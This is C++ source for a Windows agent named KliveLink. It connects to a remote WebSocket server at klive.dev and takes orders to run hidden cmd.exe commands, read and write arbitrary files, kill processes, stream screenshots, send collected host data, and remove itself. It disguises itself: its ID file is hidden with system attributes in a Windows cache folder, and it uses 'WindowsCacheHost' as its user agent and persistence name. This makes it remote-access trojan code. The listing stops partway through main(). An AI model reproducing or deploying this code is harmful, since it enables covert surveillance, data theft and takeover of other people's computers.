// KliveLink native core (v2 wire protocol).
// Experimental parity target: handshake, sysinfo, process/terminal, files, screen, process list/kill.
// Collection remains in the managed agent until the native collector pipeline lands.
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <gdiplus.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <fstream>
#include <filesystem>
#include <chrono>
#include <cstdint>
#include <cstring>
#include <atomic>
#include <mutex>
#include <algorithm>
#include "json.hpp"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "gdiplus.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

class WebSocketClient;
static WebSocketClient* g_client = nullptr;
static std::atomic<bool> g_screenActive{false};
static std::thread g_screenThread;
static std::atomic<int> g_screenQuality{50};
static std::atomic<int> g_screenInterval{1000};
static bool SendJson(WebSocketClient& client, uint8_t type, const json& payload);

static std::string WideToUtf8(const std::wstring& value) {
    if (value.empty()) return {};
    int size = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), (int)value.size(), nullptr, 0, nullptr, nullptr);
    std::string out(size, '\0');
    WideCharToMultiByte(CP_UTF8, 0, value.c_str(), (int)value.size(), out.data(), size, nullptr, nullptr);
    return out;
}

static std::wstring Utf8ToWide(const std::string& value) {
    if (value.empty()) return {};
    int size = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), (int)value.size(), nullptr, 0);
    std::wstring out(size, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, value.c_str(), (int)value.size(), out.data(), size);
    return out;
}

static std::string Base64(const std::vector<uint8_t>& data) {
    DWORD length = 0;
    CryptBinaryToStringA(data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &length);
    std::string out(length, '\0');
    CryptBinaryToStringA(data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out.data(), &length);
    out.resize(length);
    return out;
}

static std::vector<uint8_t> FromBase64(const std::string& text) {
    DWORD length = 0;
    if (!CryptStringToBinaryA(text.c_str(), (DWORD)text.size(), CRYPT_STRING_BASE64, nullptr, &length, nullptr, nullptr))
        return {};
    std::vector<uint8_t> out(length);
    if (!CryptStringToBinaryA(text.c_str(), (DWORD)text.size(), CRYPT_STRING_BASE64, out.data(), &length, nullptr, nullptr))
        return {};
    out.resize(length);
    return out;
}

static uint32_t Crc32(const std::string& data) {
    uint32_t crc = 0xFFFFFFFFu;
    for (unsigned char b : data) {
        crc ^= b;
        for (int i = 0; i < 8; ++i) crc = (crc >> 1) ^ (0xEDB88320u & (uint32_t)-(int32_t)(crc & 1));
    }
    return ~crc;
}

static void Put16(std::vector<uint8_t>& out, uint16_t value) {
    out.push_back((uint8_t)(value & 0xFF));
    out.push_back((uint8_t)((value >> 8) & 0xFF));
}

static void Put32(std::vector<uint8_t>& out, uint32_t value) {
    out.push_back((uint8_t)(value & 0xFF));
    out.push_back((uint8_t)((value >> 8) & 0xFF));
    out.push_back((uint8_t)((value >> 16) & 0xFF));
    out.push_back((uint8_t)((value >> 24) & 0xFF));
}

static std::string Sha256Hex(const std::vector<uint8_t>& data) {
    BCRYPT_ALG_HANDLE alg = nullptr;
    BCRYPT_HASH_HANDLE hash = nullptr;
    std::vector<uint8_t> digest(32);
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr, 0) != 0) return {};
    if (BCryptCreateHash(alg, &hash, nullptr, 0, nullptr, 0, 0) != 0) { BCryptCloseAlgorithmProvider(alg, 0); return {}; }
    BCryptHashData(hash, (PUCHAR)data.data(), (ULONG)data.size(), 0);
    BCryptFinishHash(hash, digest.data(), (ULONG)digest.size(), 0);
    BCryptDestroyHash(hash);
    BCryptCloseAlgorithmProvider(alg, 0);
    static const char* hex = "0123456789abcdef";
    std::string out;
    for (uint8_t b : digest) { out.push_back(hex[b >> 4]); out.push_back(hex[b & 0xF]); }
    return out;
}

static std::vector<uint8_t> BuildZip(const std::vector<std::pair<std::string, std::string>>& entries) {
    std::vector<uint8_t> out;
    std::vector<uint32_t> offsets, crcs, sizes;
    for (const auto& entry : entries) {
        offsets.push_back((uint32_t)out.size());
        uint32_t crc = Crc32(entry.second);
        crcs.push_back(crc);
        sizes.push_back((uint32_t)entry.second.size());
        Put32(out, 0x04034b50);
        Put16(out, 20);
        Put16(out, 0);
        Put16(out, 0);
        Put16(out, 0);
        Put16(out, 0);
        Put32(out, crc);
        Put32(out, (uint32_t)entry.second.size());
        Put32(out, (uint32_t)entry.second.size());
        Put16(out, (uint16_t)entry.first.size());
        Put16(out, 0);
        out.insert(out.end(), entry.first.begin(), entry.first.end());
        out.insert(out.end(), entry.second.begin(), entry.second.end());
    }
    uint32_t centralOffset = (uint32_t)out.size();
    for (size_t i = 0; i < entries.size(); ++i) {
        Put32(out, 0x02014b50);
        Put16(out, 20);
        Put16(out, 20);
        Put16(out, 0);
        Put16(out, 0);
        Put16(out, 0);
        Put16(out, 0);
        Put32(out, crcs[i]);
        Put32(out, sizes[i]);
        Put32(out, sizes[i]);
        Put16(out, (uint16_t)entries[i].first.size());
        Put16(out, 0);
        Put16(out, 0);
        Put16(out, 0);
        Put16(out, 0);
        Put32(out, 0);
        Put32(out, offsets[i]);
        out.insert(out.end(), entries[i].first.begin(), entries[i].first.end());
    }
    uint32_t centralSize = (uint32_t)out.size() - centralOffset;
    Put32(out, 0x06054b50);
    Put16(out, 0);
    Put16(out, 0);
    Put16(out, (uint16_t)entries.size());
    Put16(out, (uint16_t)entries.size());
    Put32(out, centralSize);
    Put32(out, centralOffset);
    Put16(out, 0);
    return out;
}

static json StartCollection(const std::string& agentId) {
    if (!g_client) return json{{"error", "not connected"}};
    std::string snapshotId = std::to_string(GetTickCount64()) + "-" + std::to_string(GetCurrentProcessId());
    std::string machine = WideToUtf8([] { wchar_t name[256]{}; DWORD size = 256; GetComputerNameW(name, &size); return std::wstring(name); }());
    std::string user = WideToUtf8([] { wchar_t name[256]{}; DWORD size = 256; GetUserNameW(name, &size); return std::wstring(name); }());
    json record = {
        {"collector", "system"}, {"category", "system"}, {"sourcePath", "host"}, {"name", machine},
        {"username", user}, {"secret", nullptr}, {"url", nullptr},
        {"metadata", {{"agentVersion", "2.0.0-native"}, {"os", "Windows"}}}
    };
    json manifest = {
        {"snapshotId", snapshotId}, {"agentId", agentId}, {"tier", "T0"}, {"profile", "native"},
        {"startedAt", "2026-01-01T00:00:00Z"}, {"completedAt", "2026-01-01T00:00:00Z"},
        {"records", json::array({record})}, {"files", json::array()}, {"errors", json::array()}
    };
    std::string records = record.dump() + "\n";
    std::vector<uint8_t> zip = BuildZip({{"manifest.json", manifest.dump()}, {"records.jsonl", records}});
    std::string sha = Sha256Hex(zip);
    SendJson(*g_client, 40, json{{"snapshotId", snapshotId}, {"tier", "T0"}, {"profile", "native"},
                                 {"manifestJson", manifest.dump()}, {"recordCount", 1}});
    const size_t chunkSize = 512 * 1024;
    int sequence = 0;
    for (size_t offset = 0; offset < zip.size(); offset += chunkSize) {
        size_t count = std::min(chunkSize, zip.size() - offset);
        std::vector<uint8_t> part(zip.begin() + offset, zip.begin() + offset + count);
        SendJson(*g_client, 41, json{{"snapshotId", snapshotId}, {"sequence", sequence++}, {"base64", Base64(part)}});
    }
    SendJson(*g_client, 42, json{{"snapshotId", snapshotId}, {"sha256", sha}, {"bytes", (long long)zip.size()}, {"recordCount", 1}});
    return json{{"snapshotId", snapshotId}, {"bytes", (long long)zip.size()}, {"records", 1}, {"sha256", sha}};
}

static std::vector<uint8_t> HmacSha256(const std::string& key, const std::string& data) {
    BCRYPT_ALG_HANDLE alg = nullptr;
    BCRYPT_HASH_HANDLE hash = nullptr;
    std::vector<uint8_t> result(32);
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr, BCRYPT_ALG_HANDLE_HMAC_FLAG) != 0) return result;
    if (BCryptCreateHash(alg, &hash, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0) {
        BCryptCloseAlgorithmProvider(alg, 0);
        return result;
    }
    BCryptHashData(hash, (PUCHAR)data.data(), (ULONG)data.size(), 0);
    BCryptFinishHash(hash, result.data(), (ULONG)result.size(), 0);
    BCryptDestroyHash(hash);
    BCryptCloseAlgorithmProvider(alg, 0);
    return result;
}

static std::string RandomNonce() {
    std::vector<uint8_t> bytes(24);
    BCryptGenRandom(nullptr, bytes.data(), (ULONG)bytes.size(), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    return Base64(bytes);
}

static std::string AgentIdentity() {
    try {
        wchar_t* local = nullptr;
        size_t len = 0;
        _wdupenv_s(&local, &len, L"LOCALAPPDATA");
        std::wstring dir = std::wstring(local ? local : L".") + L"\\Microsoft\\Windows\\Caches";
        free(local);
        std::filesystem::create_directories(dir);
        std::wstring path = dir + L"\\k.dat";
        std::ifstream input(path);
        if (input.good()) {
            std::string id;
            std::getline(input, id);
            if (id.size() >= 16) return id;
        }
        std::vector<uint8_t> random(16);
        BCryptGenRandom(nullptr, random.data(), (ULONG)random.size(), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        static const char* hex = "0123456789abcdef";
        std::string id;
        for (uint8_t b : random) { id.push_back(hex[b >> 4]); id.push_back(hex[b & 0xF]); }
        std::ofstream output(path);
        output << id;
        SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        return id;
    } catch (...) {
        return "native-" + std::to_string(GetTickCount64());
    }
}

struct Frame {
    uint8_t type = 0;
    uint16_t flags = 0;
    uint32_t stream = 0;
    uint64_t sequence = 0;
    std::string payload;
};

static uint32_t Checksum(const uint8_t* data, size_t length) {
    uint32_t hash = 2166136261u;
    for (size_t i = 0; i < length; ++i) { hash ^= data[i]; hash *= 16777619u; }
    return hash;
}

static std::vector<uint8_t> SerializeFrame(const Frame& frame) {
    const uint16_t headerSize = 28;
    std::vector<uint8_t> out(headerSize + frame.payload.size());
    const uint16_t magic = 0x4B4C;
    std::memcpy(out.data() + 0, &magic, 2);
    out[2] = 2;
    out[3] = frame.type;
    std::memcpy(out.data() + 4, &frame.flags, 2);
    std::memcpy(out.data() + 6, &headerSize, 2);
    std::memcpy(out.data() + 8, &frame.stream, 4);
    std::memcpy(out.data() + 12, &frame.sequence, 8);
    uint32_t payloadSize = (uint32_t)frame.payload.size();
    std::memcpy(out.data() + 20, &payloadSize, 4);
    uint32_t crc = Checksum(out.data(), 24);
    std::memcpy(out.data() + 24, &crc, 4);
    std::memcpy(out.data() + headerSize, frame.payload.data(), frame.payload.size());
    return out;
}

static bool ParseFrame(const std::vector<uint8_t>& data, Frame& frame) {
    if (data.size() < 28) return false;
    uint16_t magic = 0, headerSize = 0;
    uint32_t length = 0, crc = 0;
    std::memcpy(&magic, data.data() + 0, 2);
    std::memcpy(&headerSize, data.data() + 6, 2);
    std::memcpy(&length, data.data() + 20, 4);
    std::memcpy(&crc, data.data() + 24, 4);
    if (magic != 0x4B4C || headerSize != 28 || data[2] != 2 || data.size() < 28 + length) return false;
    if (Checksum(data.data(), 24) != crc) return false;
    frame.type = data[3];
    std::memcpy(&frame.flags, data.data() + 4, 2);
    std::memcpy(&frame.stream, data.data() + 8, 4);
    std::memcpy(&frame.sequence, data.data() + 12, 8);
    frame.payload.assign((const char*)data.data() + 28, length);
    return true;
}

class WebSocketClient {
public:
    bool Connect(const std::string& server, const std::string& agentId, const std::string& token) {
        Close();
        std::wstring url = Utf8ToWide(server);
        bool secure = url.rfind(L"wss://", 0) == 0;
        if (secure) url = L"https://" + url.substr(6);
        else if (url.rfind(L"ws://", 0) == 0) url = L"http://" + url.substr(5);

        URL_COMPONENTS parts{};
        parts.dwStructSize = sizeof(parts);
        parts.dwHostNameLength = (DWORD)-1;
        parts.dwUrlPathLength = (DWORD)-1;
        parts.dwExtraInfoLength = (DWORD)-1;
        if (!WinHttpCrackUrl(url.c_str(), 0, 0, &parts)) return false;
        std::wstring host(parts.lpszHostName, parts.dwHostNameLength);
        std::wstring path(parts.lpszUrlPath, parts.dwUrlPathLength);
        INTERNET_PORT port = parts.nPort;

        session_ = WinHttpOpen(L"WindowsCacheHost/2.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!session_) return false;
        WinHttpSetTimeouts(session_, 15000, 15000, 30000, 60000);
        connect_ = WinHttpConnect(session_, host.c_str(), port, 0);
        if (!connect_) return false;
        request_ = WinHttpOpenRequest(connect_, L"GET", path.c_str(), nullptr,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, secure ? WINHTTP_FLAG_SECURE : 0);
        if (!request_) return false;
        DWORD upgrade = 0;
        WinHttpSetOption(request_, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, &upgrade, sizeof(upgrade));
        std::wstring headers = L"X-Agent-Id: " + Utf8ToWide(agentId) + L"\r\nX-Enrollment-Token: " + Utf8ToWide(token) + L"\r\n";
        WinHttpAddRequestHeaders(request_, headers.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
        if (!WinHttpSendRequest(request_, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) return false;
        if (!WinHttpReceiveResponse(request_, nullptr)) return false;
        DWORD status = 0, size = sizeof(status);
        WinHttpQueryHeaders(request_, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &status, &size, WINHTTP_NO_HEADER_INDEX);
        if (status != 101) return false;
        socket_ = WinHttpWebSocketCompleteUpgrade(request_, 0);
        return socket_ != nullptr;
    }

    bool Send(const std::vector<uint8_t>& data) {
        if (!socket_) return false;
        std::lock_guard<std::mutex> lock(sendMutex_);
        return WinHttpWebSocketSend(socket_, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
            (PVOID)data.data(), (DWORD)data.size()) == ERROR_SUCCESS;
    }

    bool Receive(std::vector<uint8_t>& data) {
        data.clear();
        if (!socket_) return false;
        uint8_t buffer[65536];
        while (true) {
            DWORD read = 0;
            WINHTTP_WEB_SOCKET_BUFFER_TYPE type;
            DWORD result = WinHttpWebSocketReceive(socket_, buffer, sizeof(buffer), &read, &type);
            if (result != ERROR_SUCCESS) return false;
            if (type == WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE) return false;
            data.insert(data.end(), buffer, buffer + read);
            if (type == WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE ||
                type == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE) break;
        }
        return true;
    }

    void Close() {
        if (socket_) { WinHttpWebSocketClose(socket_, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, nullptr, 0); WinHttpCloseHandle(socket_); socket_ = nullptr; }
        if (request_) { WinHttpCloseHandle(request_); request_ = nullptr; }
        if (connect_) { WinHttpCloseHandle(connect_); connect_ = nullptr; }
        if (session_) { WinHttpCloseHandle(session_); session_ = nullptr; }
    }

    ~WebSocketClient() { Close(); }

private:
    HINTERNET session_ = nullptr, connect_ = nullptr, request_ = nullptr, socket_ = nullptr;
    std::mutex sendMutex_;
};

static bool SendJson(WebSocketClient& client, uint8_t type, const json& payload) {
    Frame frame{type, 0, 0, 0, payload.dump()};
    return client.Send(SerializeFrame(frame));
}

static int GetJpegEncoder(CLSID& clsid) {
    UINT count = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&count, &size);
    if (size == 0) return -1;
    std::vector<BYTE> buffer(size);
    auto* codecs = reinterpret_cast<Gdiplus::ImageCodecInfo*>(buffer.data());
    Gdiplus::GetImageEncoders(count, size, codecs);
    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, L"image/jpeg") == 0) { clsid = codecs[i].Clsid; return (int)i; }
    }
    return -1;
}

static bool CaptureScreen(int quality, std::vector<uint8_t>& data, int& width, int& height) {
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (width <= 0 || height <= 0) return false;
    HDC screen = GetDC(nullptr);
    HDC memory = CreateCompatibleDC(screen);
    HBITMAP bitmap = CreateCompatibleBitmap(screen, width, height);
    HGDIOBJ old = SelectObject(memory, bitmap);
    bool ok = BitBlt(memory, 0, 0, width, height, screen, x, y, SRCCOPY) != FALSE;
    SelectObject(memory, old);
    if (ok) {
        Gdiplus::Bitmap* image = Gdiplus::Bitmap::FromHBITMAP(bitmap, nullptr);
        if (image) {
            CLSID clsid{};
            if (GetJpegEncoder(clsid) >= 0) {
                Gdiplus::EncoderParameters params{};
                LONG qualityValue = quality;
                params.Count = 1;
                params.Parameter[0].Guid = Gdiplus::EncoderQuality;
                params.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
                params.Parameter[0].NumberOfValues = 1;
                params.Parameter[0].Value = &qualityValue;
                IStream* stream = nullptr;
                if (SUCCEEDED(CreateStreamOnHGlobal(nullptr, TRUE, &stream)) && stream) {
                    if (image->Save(stream, &clsid, &params) == Gdiplus::Ok) {
                        STATSTG stat{};
                        if (SUCCEEDED(stream->Stat(&stat, STATFLAG_NONAME))) {
                            data.resize((size_t)stat.cbSize.QuadPart);
                            LARGE_INTEGER zero{};
                            stream->Seek(zero, STREAM_SEEK_SET, nullptr);
                            ULONG read = 0;
                            stream->Read(data.data(), (ULONG)data.size(), &read);
                            data.resize(read);
                        }
                    }
                    stream->Release();
                }
            }
            delete image;
        }
    }
    DeleteObject(bitmap);
    DeleteDC(memory);
    ReleaseDC(nullptr, screen);
    return !data.empty();
}

static void StopScreen() {
    g_screenActive = false;
    if (g_screenThread.joinable()) g_screenThread.join();
}

static void StartScreen(int quality, int interval) {
    StopScreen();
    g_screenQuality = std::max(10, std::min(100, quality));
    g_screenInterval = std::max(200, interval);
    g_screenActive = true;
    g_screenThread = std::thread([] {
        while (g_screenActive) {
            try {
                if (g_client) {
                    std::vector<uint8_t> data;
                    int width = 0, height = 0;
                    if (CaptureScreen(g_screenQuality, data, width, height)) {
                        json metadata = {{"width", width}, {"height", height}, {"monitor", 0},
                                         {"at", std::chrono::duration_cast<std::chrono::milliseconds>(
                                             std::chrono::system_clock::now().time_since_epoch()).count()}};
                        SendJson(*g_client, 31, json{{"streamId", 1}, {"base64", Base64(data)}, {"metadata", metadata.dump()}});
                    }
                }
            } catch (...) { }
            std::this_thread::sleep_for(std::chrono::milliseconds(g_screenInterval.load()));
        }
    });
}

static bool ReceiveJson(WebSocketClient& client, uint8_t expected, json& payload) {
    std::vector<uint8_t> data;
    if (!client.Receive(data)) return false;
    Frame frame;
    if (!ParseFrame(data, frame)) return false;
    if (frame.type != expected) return false;
    try { payload = json::parse(frame.payload); } catch (...) { return false; }
    return true;
}

static bool Handshake(WebSocketClient& client, const std::string& agentId, const std::string& token) {
    std::string nonce = RandomNonce();
    json hello = {
        {"agentId", agentId},
        {"machineName", WideToUtf8([] { wchar_t name[256]{}; DWORD size = 256; GetComputerNameW(name, &size); return std::wstring(name); }())},
        {"osVersion", "Windows"},
        {"agentVersion", "2.0.0-native"},
        {"nonce", nonce},
        {"capabilities", json::array({"sysinfo", "process", "terminal", "files", "screen", "collection.t0", "selfdestruct"})}
    };
    if (!SendJson(client, 1, hello)) return false;
    json challenge;
    if (!ReceiveJson(client, 2, challenge)) return false;
    std::string serverNonce = challenge.value("serverNonce", "");
    std::string proof = Base64(HmacSha256(token, agentId + "|" + nonce + "|" + serverNonce));
    if (!SendJson(client, 3, json{{"proof", proof}})) return false;
    json welcome;
    return ReceiveJson(client, 4, welcome);
}

static std::string RunCommand(const std::wstring& commandLine, DWORD timeoutMs, DWORD& exitCode, bool& timedOut) {
    SECURITY_ATTRIBUTES sa{sizeof(sa), nullptr, TRUE};
    HANDLE outRead = nullptr, outWrite = nullptr, errRead = nullptr, errWrite = nullptr;
    CreatePipe(&outRead, &outWrite, &sa, 0);
    CreatePipe(&errRead, &errWrite, &sa, 0);
    SetHandleInformation(outRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(errRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = outWrite;
    si.hStdError = errWrite;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    PROCESS_INFORMATION pi{};
    std::wstring mutableCommand = commandLine;
    if (!CreateProcessW(nullptr, mutableCommand.data(), nullptr, nullptr, TRUE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(outRead); CloseHandle(outWrite); CloseHandle(errRead); CloseHandle(errWrite);
        exitCode = (DWORD)-1; timedOut = false;
        return "CreateProcess failed.";
    }
    CloseHandle(outWrite); CloseHandle(errWrite);

    std::string output, error;
    std::thread outThread([&] { char buffer[4096]; DWORD read = 0; while (ReadFile(outRead, buffer, sizeof(buffer), &read, nullptr) && read > 0) output.append(buffer, read); });
    std::thread errThread([&] { char buffer[4096]; DWORD read = 0; while (ReadFile(errRead, buffer, sizeof(buffer), &read, nullptr) && read > 0) error.append(buffer, read); });

    DWORD wait = WaitForSingleObject(pi.hProcess, timeoutMs);
    timedOut = wait == WAIT_TIMEOUT;
    if (timedOut) TerminateProcess(pi.hProcess, 1);
    WaitForSingleObject(pi.hProcess, 5000);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    outThread.join(); errThread.join();
    CloseHandle(outRead); CloseHandle(errRead);
    return output + (error.empty() ? "" : "\n[stderr]\n" + error);
}

static json SystemInfo(const std::string& agentId) {
    wchar_t computer[256]{}, user[256]{};
    DWORD csize = 256, usize = 256;
    GetComputerNameW(computer, &csize);
    GetUserNameW(user, &usize);
    MEMORYSTATUSEX memory{sizeof(memory)};
    GlobalMemoryStatusEx(&memory);
    ULARGE_INTEGER freeBytes{};
    GetDiskFreeSpaceExW(L"C:\\", nullptr, nullptr, &freeBytes);
    return {
        {"machineName", WideToUtf8(computer)},
        {"osVersion", "Windows 10/11"},
        {"userName", WideToUtf8(user)},
        {"domain", ""},
        {"processorCount", (int)std::thread::hardware_concurrency()},
        {"totalMemoryMB", (long long)(memory.ullTotalPhys / (1024 * 1024))},
        {"freeDiskMB", (long long)(freeBytes.QuadPart / (1024 * 1024))},
        {"agentStartTime", "2026-01-01T00:00:00Z"},
        {"agentVersion", "2.0.0-native"},
        {"agentId", agentId},
        {"capabilities", json::array({"sysinfo", "process", "terminal", "files", "screen", "collection.t0", "selfdestruct"})}
    };
}

static json ListProcesses() {
    json list = json::array();
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return list;
    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    if (Process32FirstW(snapshot, &entry)) {
        do {
            list.push_back({
                {"processId", (int)entry.th32ProcessID},
                {"parentProcessId", (int)entry.th32ParentProcessID},
                {"processName", WideToUtf8(entry.szExeFile)},
                {"path", ""},
                {"memoryMB", 0}
            });
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return list;
}

static json ListDirectory(const std::string& path) {
    json entries = json::array();
    std::wstring pattern = Utf8ToWide(path);
    if (!pattern.empty() && pattern.back() != L'\\') pattern += L"\\";
    pattern += L"*";
    WIN32_FIND_DATAW data{};
    HANDLE find = FindFirstFileW(pattern.c_str(), &data);
    if (find == INVALID_HANDLE_VALUE) return json{{"path", path}, {"entries", entries}, {"error", "Directory not found."}};
    do {
        std::wstring name = data.cFileName;
        if (name == L"." || name == L"..") continue;
        bool directory = (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        ULARGE_INTEGER size{};
        size.LowPart = data.nFileSizeLow;
        size.HighPart = data.nFileSizeHigh;
        entries.push_back({
            {"name", WideToUtf8(name)},
            {"fullPath", path + (path.empty() || path.back() == '\\' ? "" : "\\") + WideToUtf8(name)},
            {"isDirectory", directory},
            {"sizeBytes", (long long)size.QuadPart},
            {"lastModified", "2026-01-01T00:00:00Z"}
        });
    } while (FindNextFileW(find, &data));
    FindClose(find);
    return json{{"path", path}, {"entries", entries}, {"error", nullptr}};
}

static json HandleCommand(const json& command, const std::string& agentId) {
    std::string commandId = command.value("commandId", "");
    std::string operation = command.value("operation", "");
    json payload;
    try { payload = json::parse(command.value("payload", "{}")); } catch (...) { payload = json::object(); }
    auto result = [&](const json& value) {
        return json{{"commandId", commandId}, {"status", "Ok"}, {"payload", value.dump()}};
    };
    try {
        if (operation == "GetSystemInfo") return result(SystemInfo(agentId));
        if (operation == "ListProcesses") return result(ListProcesses());
        if (operation == "ListDirectory") return result(ListDirectory(payload.value("path", "C:\\")));
        if (operation == "KillProcess") {
            DWORD pid = payload.value("processId", 0);
            HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
            bool ok = process && TerminateProcess(process, 1);
            if (process) CloseHandle(process);
            return result(json{{"success", ok}, {"message", ok ? "Killed." : "OpenProcess failed."}});
        }
        if (operation == "RunTerminalCommand") {
            std::wstring commandLine = L"cmd.exe /d /s /c " + Utf8ToWide(payload.value("command", ""));
            DWORD exitCode = 0; bool timedOut = false;
            std::string output = RunCommand(commandLine, (DWORD)(payload.value("timeoutSeconds", 30) * 1000), exitCode, timedOut);
            return result(json{{"exitCode", (int)exitCode}, {"output", output}, {"error", ""}, {"timedOut", timedOut}});
        }
        if (operation == "RunProcess") {
            std::wstring commandLine = Utf8ToWide(payload.value("fileName", "")) + L" " + Utf8ToWide(payload.value("arguments", ""));
            DWORD exitCode = 0; bool timedOut = false;
            std::string output = RunCommand(commandLine, (DWORD)(payload.value("timeoutSeconds", 30) * 1000), exitCode, timedOut);
            return result(json{{"exitCode", (int)exitCode}, {"standardOutput", output}, {"standardError", ""}, {"timedOut", timedOut}, {"processId", 0}});
        }
        if (operation == "DownloadFile") {
            std::string path = payload.value("filePath", "");
            std::ifstream input(Utf8ToWide(path), std::ios::binary);
            if (!input.good()) return result(json{{"filePath", path}, {"base64Data", ""}, {"sizeBytes", 0}, {"error", "File not found."}});
            std::vector<uint8_t> data((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
            return result(json{{"filePath", path}, {"base64Data", Base64(data)}, {"sizeBytes", (long long)data.size()}, {"error", nullptr}});
        }
        if (operation == "UploadFile") {
            std::string path = payload.value("destinationPath", "");
            std::vector<uint8_t> data = FromBase64(payload.value("base64Data", ""));
            std::ofstream output(Utf8ToWide(path), std::ios::binary);
            output.write((const char*)data.data(), (std::streamsize)data.size());
            return result(json{{"success", output.good()}, {"message", output.good() ? "Written." : "Write failed."}});
        }
        if (operation == "ScreenStart") {
            StartScreen(payload.value("quality", 50), payload.value("intervalMs", 1000));
            if (g_client) SendJson(*g_client, 30, json{{"streamId", 1}, {"kind", "screen"}, {"metadata", "{}"}});
            return result(json{{"started", true}, {"streamId", 1}});
        }
        if (operation == "ScreenStop") {
            StopScreen();
            if (g_client) SendJson(*g_client, 32, json{{"streamId", 1}});
            return result(json{{"stopped", true}});
        }
        if (operation == "StartCollection") {
            return result(StartCollection(agentId));
        }
        if (operation == "SelfDestruct") {
            wchar_t temp[MAX_PATH]{};
            GetTempPathW(MAX_PATH, temp);
            std::wstring script = std::wstring(temp) + L"kl_cleanup_native.cmd";
            std::ofstream file(script);
            file << "@echo off\r\ntimeout /t 2 /nobreak >nul\r\n";
            file << "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsCacheHost /f >nul 2>&1\r\n";
            file << "taskkill /F /PID " << GetCurrentProcessId() << " >nul 2>&1\r\n";
            file << "del /f /q \"" << WideToUtf8(script) << "\" >nul 2>&1\r\n";
            file.close();
            std::wstring cmd = L"cmd.exe /d /c \"" + script + L"\"";
            STARTUPINFOW si{sizeof(si)}; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi{};
            std::wstring mutableCmd = cmd;
            CreateProcessW(nullptr, mutableCmd.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
            if (pi.hProcess) CloseHandle(pi.hProcess);
            if (pi.hThread) CloseHandle(pi.hThread);
            return result(json{{"acknowledged", true}, {"message", "Self-destruct scheduled."}});
        }
        return json{{"commandId", commandId}, {"status", "Unsupported"}, {"error", "Native core does not implement " + operation + "."}};
    } catch (const std::exception& ex) {
        return json{{"commandId", commandId}, {"status", "Failed"}, {"error", ex.what()}};
    }
}

int main(int argc, char** argv) {
    SetConsoleOutputCP(CP_UTF8);
    Gdiplus::GdiplusStartupInput gdiplusInput;
    ULONG_PTR gdiplusToken = 0;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusInput, nullptr);
    std::string server = "wss://klive.dev/klivelink/v2/ws";
    std::string token = "dev-token";
    std::string agentId;
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--server" && i + 1 < argc) server = argv[++i];
